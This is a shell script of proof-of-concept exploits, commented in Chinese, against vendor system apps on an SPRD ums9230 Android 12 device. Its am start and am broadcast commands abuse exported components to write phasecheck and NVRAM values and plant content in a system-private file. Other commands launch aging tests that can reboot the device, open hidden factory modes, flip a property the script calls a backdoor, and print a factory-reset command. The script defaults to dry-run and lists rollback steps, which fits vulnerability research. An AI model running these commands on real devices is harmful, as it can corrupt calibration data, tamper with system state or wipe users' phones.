#!/system/bin/sh
# ============================================================
# Android 12 (SPRD ums9230) 系统应用漏洞 PoC 集合
# 用法: adb push poc.sh /data/local/tmp/ && adb shell sh /data/local/tmp/poc.sh
# 设计: 默认 dry-run；破坏性操作需 --yes；每个漏洞附回滚方式
# ============================================================

PKG_MMI="com.sprd.validationtools"
PKG_EM="com.sprd.engineermode"
PKG_AGING="com.sprd.agingtest"
PKG_FT="com.sprd.factorytest"
PKG_STAT="com.baidu.duershow.statistic"
PKG_SRMI="com.sprd.srmi"
RCV_QMMI="com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver2"
RCV_MODEM="com.unisoc.engineermode.modules.debuglog.switchmachineinfo.ModemAssertInfoActivity\$ModemAssertReceiver"

DRY_RUN=1
[ "$1" = "--yes" ] && DRY_RUN=0

run() {
  if [ $DRY_RUN -eq 1 ]; then
    printf '  [dry-run] %s\n' "$*"
  else
    printf '  [exec] %s\n' "$*"
    $@ 2>&1 | sed 's/^/      /'
  fi
}
hr() { echo "------------------------------------------------------------"; }
banner() { echo; hr; echo "$1"; hr; }

banner "[环境] 当前身份"
echo "  UID: $(id -u)   (1000=system, 2000=shell, 10xxx=普通应用)"

# ---------- V06 ----------
banner "V06  AudioStationUpdateActivity -> phasecheck 分区写入"
echo "  组件: $PKG_MMI/.AudioStationUpdateActivity"
echo "  原理: onCreate 无条件读 msg extra 并写 phasecheck 的 AUDIO station"
echo "  [PASS]"
run am start -n "$PKG_MMI/com.sprd.validationtools.AudioStationUpdateActivity" -e msg "AUDIO PASS"
echo "  [FAIL] (需 --yes)"
if [ $DRY_RUN -eq 0 ]; then
  am start -n "$PKG_MMI/com.sprd.validationtools.AudioStationUpdateActivity" -e msg "AUDIO FAIL"
else
  echo '    [dry-run] am start ... -e msg "AUDIO FAIL"'
fi
echo "  [回滚] 再执行一次 PASS；验证: MMITools -> 单项测试 -> Audio"

# ---------- V07 ----------
banner "V07  QmmiBroadcastReceiver2 -> Settings / NVRAM 写入"
echo "  [1] 写 Settings.System.MMI_BARCODE"
run am broadcast -a com.qualcomm.qti.qmmicustom.DEVICEINFO_ACTION_START_FLAGS2 -n "$PKG_MMI/$RCV_QMMI" --es barcode "POC_TEST"
run settings get system MMI_BARCODE
echo "  [回滚] 写入空串"
run am broadcast -a com.qualcomm.qti.qmmicustom.DEVICEINFO_ACTION_START_FLAGS2 -n "$PKG_MMI/$RCV_QMMI" --es barcode ""
echo "  [2] NVRAM 写入 (高风险, 不可完全回滚, 手动执行):"
echo "    am broadcast -a com.qualcomm.qti.qmmicustom.QMMI_ACTION_START_FLAGS2 -n $PKG_MMI/$RCV_QMMI --es barcode TEST123 --es station AUDIO"

# ---------- V10 ----------
banner "V10  ModemAssertReceiver -> system 私有目录任意写入"
echo "  目标: /data/data/$PKG_EM/files/EmInfo/modem_assert_info.xml"
run am broadcast -a com.sprd.engineermode.MODEM_ASSERT_INFO -n "$PKG_EM/$RCV_MODEM" --es modem_stat "modem_assert" --es modem_info "POC_INJECTED"
echo "  验证: EngineerMode -> DEBUG&LOG -> Switch Machine Info -> Modem assert Info"
echo "  回滚: 页面点'清除文件信息'"

# ---------- V11/V12 ----------
banner "V11/V12  PhoneBootReceiver -> 拉起老化测试 (含 Reboot!)"
echo "  [!] 勿在界面上点 Start / 勾 Reboot"
run am broadcast -a android.intent.action.MAIN -n "$PKG_AGING/com.sprd.agingtest.PhoneBootReceiver" -d "https://123456/"
run am broadcast -a android.intent.action.MAIN -n "$PKG_FT/com.sprd.factorytest.PhoneBootReceiver" -d "https://1234/"
echo "  回滚: 返回键退出"

# ---------- V08 ----------
banner "V08  ValidationToolsBroadcastReceiver -> 工厂模式"
run am broadcast -a android.intent.action.MAIN -n "$PKG_MMI/com.sprd.validationtools.ValidationToolsBroadcastReceiver" -d "https://83789/"
echo "  其他码: 654987 (iSharkL210c10), 833 (ListItemTest)"

# ---------- V05 ----------
banner "V05  EMStartReceiver -> 隐藏属性写后门"
run getprop persist.sys.local.update.support
echo "  [翻转 host=3682] (默认不执行):"
echo "    am broadcast -a android.intent.action.MAIN -n $PKG_EM/com.sprd.engineermode.EMStartReceiver -d https://3682/"
echo "  其他码: 83781/83782 (EngineerMode), 1688 (SensorsID), 0000 (PhoneInfo/ctcc), 33284"

# ---------- V02 ----------
banner "V02  PingActivity -> system UID 执行 ping"
echo "  注意: 该 Activity 未导出, am start 会被拒"
echo "  实际路径: EngineerMode -> DEBUG&LOG -> Design For Test -> Ping packages"
run am start -n "$PKG_EM/com.unisoc.engineermode.modules.debuglog.designfortest.pingpackages.PingActivity"

# ---------- V01 ----------
banner "V01  FactoryReset (绝对不要自动执行)"
echo "    am start -n $PKG_MMI/com.sprd.validationtools.FactoryReset"
echo "    [!] 确认后设备数据全部丢失"

# ---------- V13 ----------
banner "V13  SrmiManager -> 导出 Binder 服务"
echo "  服务: com.sprd.srmi/SrmiManager   接口: com.sprd.srmi.ISrmiService"
echo "  客户端样例: poc/java/SrmiClient.java"
run dumpsys package $PKG_SRMI

echo; hr
echo "[完成] dry-run 模式下未实际执行。加 --yes 才会执行。"
hr
